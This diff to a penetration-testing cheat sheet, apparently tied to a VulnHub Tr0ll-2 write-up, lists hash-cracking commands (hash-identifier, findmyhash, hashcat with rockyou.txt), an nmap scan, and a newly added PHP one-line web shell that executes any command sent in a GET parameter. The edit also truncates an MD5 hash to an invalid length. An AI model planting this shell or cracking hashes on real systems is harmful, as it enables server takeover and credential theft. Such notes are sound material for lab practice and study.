@@ -33,7 +33,7 @@
 
 	1. hash-identifier  
 		helps to check the type of hash; MD5, MD2
-	2. findmyhash MD5 -h b78aae356709f8c31118ea613980954b
+	2. findmyhash MD5 -h b78aae356709f8c31118ea613980954
 	
 	3. hashcat -a 0 -m 0 fileContaingHash /usr/share/wordlists/rockyou.txt -o result.txt
 
@@ -408,6 +408,10 @@ ref: https://f4l13n5n0w.github.io/blog/2015/06/24/vulnhub-tr0ll-2/
 	}
 
 	?> 
+	
+	Another Simple php shell (one liner)
+	
+	<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
 
 # nmap
 	1. nmap -iL list.txt -sn -Pn
